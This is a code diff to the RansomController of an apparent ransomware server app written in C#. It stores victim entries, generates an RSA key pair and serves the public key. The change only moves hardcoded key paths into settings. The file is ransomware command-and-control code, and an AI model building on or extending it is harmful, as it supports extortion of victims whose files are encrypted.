@@ -8,27 +8,25 @@ using System.Text;
 using System.Text.RegularExpressions;
 using System.Web;
 using System.Web.Mvc;
-
+using RansomwareWebApp.Properties;
 namespace RansomwareWebApp.Controllers
 {
     public class RansomController : Controller
     {
         private static Dictionary<string, VictimEntry> _db = new Dictionary<string, VictimEntry>();
-        private static readonly string PUBLIC_KEY_PATH = "C:\\publickey.xml";
-        private static readonly string PRIVATE_KEY_PATH = "C:\\privatekey.xml";
         private static RSACryptoServiceProvider SERVER_CRYPTO = new RSACryptoServiceProvider();
         private static string PUBLIC_KEY_XML;
         public RansomController()
         {
-            if (!System.IO.File.Exists(PRIVATE_KEY_PATH)) GenerateKeys(); //generate server keys if needed
-            SERVER_CRYPTO.FromXmlString(System.IO.File.ReadAllText(PRIVATE_KEY_PATH));
-            PUBLIC_KEY_XML = System.IO.File.ReadAllText(PUBLIC_KEY_PATH);
+            if (!System.IO.File.Exists(Settings.Default.PRIVATE_KEY_PATH)) GenerateKeys(); //generate server keys if needed
+            SERVER_CRYPTO.FromXmlString(System.IO.File.ReadAllText(Settings.Default.PRIVATE_KEY_PATH));
+            PUBLIC_KEY_XML = System.IO.File.ReadAllText(Settings.Default.PUBLIC_KEY_PATH);
         }
         private void GenerateKeys()
         {
             var RSA = new RSACryptoServiceProvider(2048);
-            System.IO.File.AppendAllText(PUBLIC_KEY_PATH, RSA.ToXmlString(false));
-            System.IO.File.AppendAllText(PRIVATE_KEY_PATH, RSA.ToXmlString(true));
+            System.IO.File.AppendAllText(Settings.Default.PUBLIC_KEY_PATH, RSA.ToXmlString(false));
+            System.IO.File.AppendAllText(Settings.Default.PRIVATE_KEY_PATH, RSA.ToXmlString(true));
         }
 
         [Route("publickey")]
